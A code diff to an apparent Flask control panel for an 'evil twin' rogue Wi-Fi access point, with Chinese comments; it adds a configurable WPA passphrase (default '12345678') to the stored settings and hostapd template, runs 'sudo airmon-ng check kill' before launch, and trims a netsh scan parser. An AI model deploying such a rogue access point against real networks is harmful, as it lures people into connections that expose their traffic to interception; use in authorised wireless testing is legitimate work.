@@ -54,7 +54,7 @@ def manage_config():
     conn = get_db()
     
     if request.method == 'GET':
-        config = conn.execute('SELECT evil_ssid, evil_channel, network_interface FROM config WHERE id = 1').fetchone()
+        config = conn.execute('SELECT evil_ssid, evil_channel, network_interface, evil_passphrase FROM config WHERE id = 1').fetchone()
         conn.close()
         return jsonify(dict(config))
     
@@ -65,9 +65,10 @@ def manage_config():
         evil_ssid = data.get('evil_ssid', 'Free_WiFi')
         evil_channel = data.get('evil_channel', 6)
         network_interface = data.get('network_interface', 'wlan0')
+        evil_passphrase = data.get('evil_passphrase', '12345678')
         
-        conn.execute('UPDATE config SET evil_ssid = ?, evil_channel = ?, network_interface = ? WHERE id = 1', 
-                    (evil_ssid, evil_channel, network_interface))
+        conn.execute('UPDATE config SET evil_ssid = ?, evil_channel = ?, network_interface = ?, evil_passphrase = ? WHERE id = 1', 
+                    (evil_ssid, evil_channel, network_interface, evil_passphrase))
         conn.commit()
         conn.close()
         
@@ -241,35 +242,18 @@ def parse_iw_scan(stdout):
 
 
 def parse_netsh_output(stdout):
-    """解析 netsh wlan show networks mode=bssid 输出"""
-    aps = []
-    current_ssid = ''
-    current_auth = 'OPEN'
-    in_block = False
-    for line in stdout.splitlines():
-        stripped = line.strip()
-        if stripped.startswith('SSID ') and ':' in stripped:
-            current_ssid = stripped.split(':', 1)[1].strip()
-            in_block = True
-        elif in_block and stripped.startswith('Authentication'):
-            auth = stripped.split(':', 1)[1].strip()
-            current_auth = auth if auth != 'Open' else 'OPEN'
-        elif in_block and stripped.startswith('BSSID ') and ':' in stripped:
-            bssid = stripped.split(':', 1)[1].strip()
-            # 采集后续两行的 Signal 和 Channel
-            # 等等，netsh 输出中 Signal 和 Channel 在 BSSID 之后的行
-            pass
-    # netsh 格式复杂，用简单的逐行状态机
+    """解析 netsh wlan show networks mode=bssid（直接调 v2）"""
     return parse_netsh_v2(stdout)
 
 
 def parse_netsh_v2(stdout):
-    """解析 netsh wlan show networks mode=bssid (v2 状态机)"""
+    """解析 netsh wlan show networks mode=bssid (状态机)"""
     import re
     aps = []
     seen = set()
     ssid = ''
     auth = 'OPEN'
+    bssid = ''
     for line in stdout.splitlines():
         s = line.strip()
         m_ssid = re.match(r'^SSID\s+\d+\s*:\s*(.+)', s)
@@ -359,12 +343,13 @@ def start_evil_twin():
     
     # 获取配置
     conn = get_db()
-    config = conn.execute('SELECT evil_ssid, evil_channel, network_interface FROM config WHERE id = 1').fetchone()
+    config = conn.execute('SELECT evil_ssid, evil_channel, network_interface, evil_passphrase FROM config WHERE id = 1').fetchone()
     conn.close()
     
     evil_ssid = config['evil_ssid']
     evil_channel = config['evil_channel']
     iface = config['network_interface']
+    passphrase = config['evil_passphrase'] if config['evil_passphrase'] else '12345678'
     
     # 1. 停止可能冲突的服务
     subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], capture_output=True)
@@ -377,7 +362,7 @@ ssid={evil_ssid}
 hw_mode=g
 channel={evil_channel}
 wpa=2
-wpa_passphrase=12345678
+wpa_passphrase={passphrase}
 wpa_key_mgmt=WPA-PSK
 rsn_pairwise=CCMP
 """
